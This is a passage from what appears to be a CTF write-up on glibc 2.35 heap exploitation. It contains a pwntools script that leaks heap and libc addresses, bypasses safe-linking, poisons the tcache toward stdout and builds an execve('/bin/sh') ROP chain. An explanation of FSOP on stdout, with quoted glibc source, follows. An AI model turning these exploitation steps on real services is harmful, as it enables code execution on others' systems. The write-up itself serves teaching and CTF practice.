   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">view</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span> 
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="n">alloc</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>

<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">view</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">heap</span> <span class="o">=</span> <span class="p">((</span><span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span><span class="p">))</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;heap @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="c1"># then we defeated safe linking lol</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;YY&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
<span class="c1"># request back the chunk we used to leak the heap</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;YY&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span> <span class="c1"># prev</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;YY&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span> <span class="c1"># a</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">)</span> <span class="c1"># barrier</span>

<span class="c1"># fill tcache</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="n">free</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

<span class="n">free</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># free(a) =&gt; unsortedbin</span>
<span class="n">free</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span> <span class="c1"># free(prev) =&gt; merged with a</span>

<span class="c1"># leak libc</span>
<span class="n">view</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x219ce0</span> <span class="c1"># - 0x1bebe0 # offset of the unsorted bin</span>

<span class="n">rop</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
<span class="n">binsh</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
<span class="n">rop</span><span class="o">.</span><span class="n">execve</span><span class="p">(</span><span class="n">binsh</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>

<span class="n">environ</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x221200</span>
<span class="n">stdout</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x21a780</span>

<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;environ: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;stdout: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stdout</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;YY&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span> <span class="c1"># pop a chunk from the tcache to let an entry left to a </span>
<span class="n">free</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># free(a) =&gt; tcache</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;T&#34;</span><span class="o">*</span><span class="mh">0x108</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x111</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">((</span><span class="n">stdout</span> <span class="o">^</span> <span class="p">((</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0xb20</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">))),</span> <span class="mh">0x130</span><span class="p">)</span> 
<span class="c1"># 0x130, too big for tcache =&gt; unsortedbin UAF on a to replace a-&gt;next with the address of the target location (stdout) </span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;TT&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
<span class="c1"># pop a from tcache</span>

<span class="c1"># next 0x100 request will return the target location (stdout)</span>

<span class="s2">&#34;&#34;&#34;
</span><span class="s2">0x55c4fbcd7a00:	0x0000000000000000	0x0000000000000141 [prev]
</span><span class="s2">0x55c4fbcd7a10:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7a20:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7a30:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7a40:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7a50:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7a60:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7a70:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7a80:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7a90:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7aa0:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7ab0:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7ac0:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7ad0:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7ae0:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7af0:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7b00:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7b10:	0x5454545454545454	0x0000000000000111 [a]
</span><span class="s2">0x55c4fbcd7b20:	0x00007f5d45ff5b57	0x4f60331b73b9000a
</span><span class="s2">0x55c4fbcd7b30:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7b40:	0x0000000000000000	0x00000000000000e1 [unsortedbin]
</span><span class="s2">0x55c4fbcd7b50:	0x00007f5819b0dce0	0x00007f5819b0dce0
</span><span class="s2">0x55c4fbcd7b60:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7b70:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7b80:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7b90:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7ba0:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7bb0:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7bc0:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7bd0:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7be0:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7bf0:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7c00:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7c10:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7c20:	0x00000000000000e0	0x0000000000000020
</span><span class="s2">0x55c4fbcd7c30:	0x0068732f6e69622f	0x000000000000000a
</span><span class="s2">0x55c4fbcd7c40:	0x0000000000000000	0x00000000000203c1 [top chunk]
</span><span class="s2">&#34;&#34;&#34;</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h1 id="fsop-on-stdout-to-leak-environ">
        FSOP on stdout to leak environ
        <a data-clipboard-text="https://nasm.re/posts/catastrophe/#fsop-on-stdout-to-leak-environ" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor FSOP on stdout to leak environ" href="#fsop-on-stdout-to-leak-environ">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>I didn&rsquo;t see first that only <code>PARTIAL RELRO</code> was enabled on the libc, so the technique I show you here was thought to face a <code>2.35</code> libc with <code>FULL RELRO</code> enabled that the reason why I didn&rsquo;t just hiijack some GOT pointers within the libc.</p>
<p>A pretty convenient way to gain code execution when the hooks (<code>__malloc_hook</code>, <code>__free_hook</code>) are not present (since <code>2.32</code> cf <a
  class="gblog-markdown__link"
  href="https://sourceware.org/pipermail/libc-alpha/2021-August/129718.html"
  
  >this for 2.34</a
>) is to leak the address of the stack to then write a ROPchain on it. To leak a stack address we can make use of the <code>environ</code> symbol stored in the dynamic linker, it contains a pointer toward <code>**envp</code>.</p>
<p>To read this pointer we need a read what where primitive! Which can be achieved through a file stream oriented programming (FSOP) attack on <code>stdout</code> for example. To dig more FSOP I advise you to read <a
  class="gblog-markdown__link"
  href="https://nasm.re/posts/onceforall/"
  
  >this write-up</a
> as well as <a
  class="gblog-markdown__link"
  href="https://nasm.re/posts/bookwriter/"
  
  >this one</a
>.</p>
<p>To understand the whole process I&rsquo;ll try to introduce you to FSOP. First of all the target structure is stdout, we wanna corrupt stdout because it&rsquo;s used ritght after the <code>fgets</code> that reads the input from the user by the <code>putchar</code> function. Basically on linux &ldquo;everything is a file&rdquo; from the character device the any stream (error, input, output, opened file) we can interact with  a resource just by opening it and by getting a file descriptor on it, right ? This way each file descripor has an associated structure called <code>FILE</code> you may have used if you have already done some stuff with files on linux. Here is its definition:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/bits/types/struct_FILE.h#L49
</span><span class="c1"></span><span class="cm">/* The tag name of this struct is _IO_FILE to preserve historic
</span><span class="cm">   C++ mangled names for functions taking FILE* arguments.
</span><span class="cm">   That name should not be used in new code.  */</span>
<span class="k">struct</span> <span class="n">_IO_FILE</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">_flags</span><span class="p">;</span>		<span class="cm">/* High-order word is _IO_MAGIC; rest is flags. */</span>

  <span class="cm">/* The following pointers correspond to the C++ streambuf protocol. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_read_ptr</span><span class="p">;</span>	<span class="cm">/* Current read pointer */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_read_end</span><span class="p">;</span>	<span class="cm">/* End of get area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_read_base</span><span class="p">;</span>	<span class="cm">/* Start of putback+get area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_write_base</span><span class="p">;</span>	<span class="cm">/* Start of put area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_write_ptr</span><span class="p">;</span>	<span class="cm">/* Current put pointer. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_write_end</span><span class="p">;</span>	<span class="cm">/* End of put area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_buf_base</span><span class="p">;</span>	<span class="cm">/* Start of reserve area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_buf_end</span><span class="p">;</span>	<span class="cm">/* End of reserve area. */</span>

  <span class="cm">/* The following fields are used to support backing up and undo. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_base</span><span class="p">;</span> <span class="cm">/* Pointer to start of non-current get area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_backup_base</span><span class="p">;</span>  <span class="cm">/* Pointer to first valid character of backup area */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_end</span><span class="p">;</span> <span class="cm">/* Pointer to end of non-current get area. */</span>

  <span class="k">struct</span> <span class="n">_IO_marker</span> <span class="o">*</span><span class="n">_markers</span><span class="p">;</span>

  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">_chain</span><span class="p">;</span>

  <span class="kt">int</span> <span class="n">_fileno</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">_flags2</span><span class="p">;</span>
  <span class="n">__off_t</span> <span class="n">_old_offset</span><span class="p">;</span> <span class="cm">/* This used to be _offset but it&#39;s too small.  */</span>

  <span class="cm">/* 1+column number of pbase(); 0 is unknown. */</span>
  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">_cur_column</span><span class="p">;</span>
  <span class="kt">signed</span> <span class="kt">char</span> <span class="n">_vtable_offset</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">_shortbuf</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>

  <span class="n">_IO_lock_t</span> <span class="o">*</span><span class="n">_lock</span><span class="p">;</span>
<span class="cp">#ifdef _IO_USE_OLD_IO_FILE
</span><span class="cp"></span><span class="p">};</span>

<span class="k">struct</span> <span class="n">_IO_FILE_complete</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="n">_file</span><span class="p">;</span>
<span class="cp">#endif
</span><span class="cp"></span>  <span class="n">__off64_t</span> <span class="n">_offset</span><span class="p">;</span>
  <span class="cm">/* Wide character stream stuff.  */</span>
  <span class="k">struct</span> <span class="n">_IO_codecvt</span> <span class="o">*</span><span class="n">_codecvt</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">_IO_wide_data</span> <span class="o">*</span><span class="n">_wide_data</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">_freeres_list</span><span class="p">;</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">_freeres_buf</span><span class="p">;</span>
  <span class="n">size_t</span> <span class="n">__pad5</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">_mode</span><span class="p">;</span>
  <span class="cm">/* Make sure we don&#39;t get into trouble again.  */</span>
  <span class="kt">char</span> <span class="n">_unused2</span><span class="p">[</span><span class="mi">15</span> <span class="o">*</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="o">-</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">size_t</span><span class="p">)];</span>
<span class="p">};</span>
</code></pre></div><p>Here are brievly role of each fields:</p>
<ul>
<li><code>_flags</code> stands for the behaviour of the stream when a file operation occurs.</li>
<li><code>_IO_read_ptr</code> address of input within the input buffer that has been already used.</li>
<li><code>_IO_read_end</code> end address of the input buffer.</li>
<li><code>_IO_read_base</code> base address of the input buffer.</li>
<li><code>_IO_write_base</code> base address of the ouput buffer.</li>
<li><code>_IO_write_ptr</code> points to the character that hasn&rsquo;t been printed yet.</li>
<li><code>_IO_write_end</code> end address of the output buffer.</li>
<li><code>_IO_buf_base</code> base address for both input and output buffer.</li>
<li><code>_IO_buf_end</code> end address for both input and output buffer.</li>
<li><code>_chain</code> stands for the single linked list that links of all file streams.</li>
<li><code>_fileno</code> stands for the file descriptor associated to the file.</li>
<li><code>_vtable_offset</code> stands for the offset of the vtable we have to use.</li>
<li><code>_offset</code> stands for the current offset within the file.</li>
</ul>
<p>Relatable flags:</p>
<ul>
<li><code>_IO_USER_BUF</code> During line buffered output, _IO_write_base==base() &amp;&amp; epptr()==base(). However, ptr() may be anywhere between base() and ebuf(). This forces a call to filebuf::overflow(int C) on every put. If there is more space in the buffer, and C is not a &lsquo;\n&rsquo;, then C is inserted, and pptr() incremented.</li>
<li><code>_IO_MAGIC</code> Magic number of <code>fp-&gt;_flags</code>.</li>
<li><code>_IO_UNBUFFERED</code> If a filebuf is unbuffered(), the _shortbuf[1] is used as the buffer.</li>
<li><code>_IO_LINKED</code> In the list of all open files.</li>
</ul>
<p>To understand I advise you to read this <a
  class="gblog-markdown__link"
  href="https://ray-cp.github.io/archivers/IO_FILE_arbitrary_read_write"
  
  >great article</a
> about FILE structures. What we gonna do right now is trying to understand the use of <code>stdout</code> during within the <code>putchar</code> function. And we will try to find a code path that will not write the provided argument (in this case the <code>\n</code> taken by <code>putchar</code>) into the output buffer we control but rather flush the file stream to directly print its content and then print the provided argument. This way we could get an arbitrary read by controlling the output buffer.
Let&rsquo;s take a closer look at the <code> __putc_unlocked_body</code> macro:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">
<span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/bits/types/struct_FILE.h#L106
</span><span class="c1"></span><span class="cp">#define __putc_unlocked_body(_ch, _fp)					\
</span><span class="cp">  (__glibc_unlikely ((_fp)-&gt;_IO_write_ptr &gt;= (_fp)-&gt;_IO_write_end)	\
</span><span class="cp">   ? __overflow (_fp, (unsigned char) (_ch))				\
</span><span class="cp">   : (unsigned char) (*(_fp)-&gt;_IO_write_ptr++ = (_ch)))
</span><span class="cp"></span>
</code></pre></div><p>It ends up calling <code>__overflow</code> if there is no more space in the output buffer (<code>(_fp)-&gt;_IO_write_ptr &gt;= (_fp)-&gt;_IO_write_end)</code>). That&rsquo;s basically the code path we need to trigger to call <code>__overflow</code> instead of just write the provided char into the output buffer.
So first condition:</p>
<ul>
<li><code>(_fp)-&gt;_IO_write_ptr &gt;= (_fp)-&gt;_IO_write_end</code></li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/genops.c#L198
</span><span class="c1"></span><span class="kt">int</span>
<span class="nf">__overflow</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">int</span> <span class="n">ch</span><span class="p">)</span>
<span class="p">{</span>
  <span class="cm">/* This is a single-byte stream.  */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">_IO_fwide</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">_IO_OVERFLOW</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">ch</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>Given the file stream isn&rsquo;t oriented (byte granularity) we directly reach the <code>_IO_OVERFLOW</code> call, now the final goal to get a leak is to reach the <code>_IO_do_write</code> call:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/fileops.c#L730
</span><span class="c1"></span>
<span class="kt">int</span>
<span class="nf">_IO_new_file_overflow</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">int</span> <span class="n">ch</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_NO_WRITES</span><span class="p">)</span> <span class="cm">/* SET ERROR */</span>
    <span class="p">{</span>
      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">;</span>
      <span class="n">__set_errno</span> <span class="p">(</span><span class="n">EBADF</span><span class="p">);</span>
      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="cm">/* If currently reading or no buffer allocated. */</span>
  <span class="k">if</span> <span class="p">((</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_CURRENTLY_PUTTING</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="cm">/* Allocate a buffer if needed. */</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
	<span class="p">{</span>
	  <span class="n">_IO_doallocbuf</span> <span class="p">(</span><span class="n">f</span><span class="p">);</span>
	  <span class="n">_IO_setg</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>
	<span class="p">}</span>
      <span class="cm">/* Otherwise must be currently reading.
</span><span class="cm">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,
</span><span class="cm">	 logically slide the buffer forwards one block (by setting the
</span><span class="cm">	 read pointers to all point at the beginning of the block).  This
</span><span class="cm">	 makes room for subsequent output.
</span><span class="cm">	 Otherwise, set the read pointers to _IO_read_end (leaving that
</span><span class="cm">	 alone, so it can continue to correspond to the external position). */</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">_IO_in_backup</span> <span class="p">(</span><span class="n">f</span><span class="p">)))</span>
	<span class="p">{</span>
	  <span class="n">size_t</span> <span class="n">nbackup</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">-</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
	  <span class="n">_IO_free_backup_area</span> <span class="p">(</span><span class="n">f</span><span class="p">);</span>
	  <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">-=</span> <span class="n">MIN</span> <span class="p">(</span><span class="n">nbackup</span><span class="p">,</span>
				   <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">-</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>
	  <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span><span class="p">;</span>
	<span class="p">}</span>

      <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">==</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span><span class="p">)</span>
	    <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="p">;</span>
      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span><span class="p">;</span>
      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">;</span>

      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_CURRENTLY_PUTTING</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">_IO_LINE_BUF</span> <span class="o">|</span> <span class="n">_IO_UNBUFFERED</span><span class="p">))</span>
	<span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">ch</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">_IO_do_write</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">,</span>
			 <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">-</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">==</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="p">)</span> <span class="cm">/* Buffer is really full */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">_IO_do_flush</span> <span class="p">(</span><span class="n">f</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
  <span class="o">*</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="o">++</span> <span class="o">=</span> <span class="n">ch</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">((</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_UNBUFFERED</span><span class="p">)</span>
